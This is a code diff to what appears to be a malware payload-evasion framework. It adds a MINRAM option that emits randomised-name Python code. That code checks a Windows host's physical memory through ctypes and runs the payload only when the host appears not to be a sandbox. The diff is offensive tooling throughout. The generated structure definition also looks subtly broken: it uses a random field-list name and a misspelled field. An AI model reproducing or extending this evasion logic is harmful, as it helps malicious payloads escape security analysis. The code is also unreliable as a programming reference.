@@ -75,7 +75,35 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
-        
+
+        if evasion_payload.required_options["MINRAM"][0].lower() != "false":
+
+            class_name = evasion_helpers.randomString()
+            field_name = evasion_helpers.randomString()
+            memory_status = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import ctypes\n'
+            check_code += '\t' * num_tabs_required + 'class ' + class_name + ' (ctypes.Structure):\n'
+            check_code += '\t' * num_tabs_required + '\t_' + field_name + '_ = [\n'
+            check_code += '\t' * num_tabs_required + '\t\t("dwLength", ctypes.c_ulong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("dwMemoryLoad", ctypes.c_ulong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("ullTotalPhys", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("ullAvailPhys", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("ullTotalPageFile", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("ullAvailPageFile", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("ullTotalVirtual", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("ullAvailVirtual", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t\t("sullAvailExtendedVirtual", ctypes.c_ulonglong),\n'
+            check_code += '\t' * num_tabs_required + '\t]\n'
+            check_code += '\t' * num_tabs_required + memory_status + ' = ' + class_name + '()\n'
+            check_code += '\t' * num_tabs_required + memory_status + '.dwLength = ctypes.sizeof(' + class_name + ')\n'
+            check_code += '\t' * num_tabs_required + 'ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(' + memory_status + '))\n'
+            check_code += '\t' * num_tabs_required + 'if ' + memory_status + '.ullTotalPhys/1073741824 > 3:\n'
+
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
         if evasion_payload.required_options["CLICKTRACK"][0].lower() != "x":
 
             rand_counter = evasion_helpers.randomString()
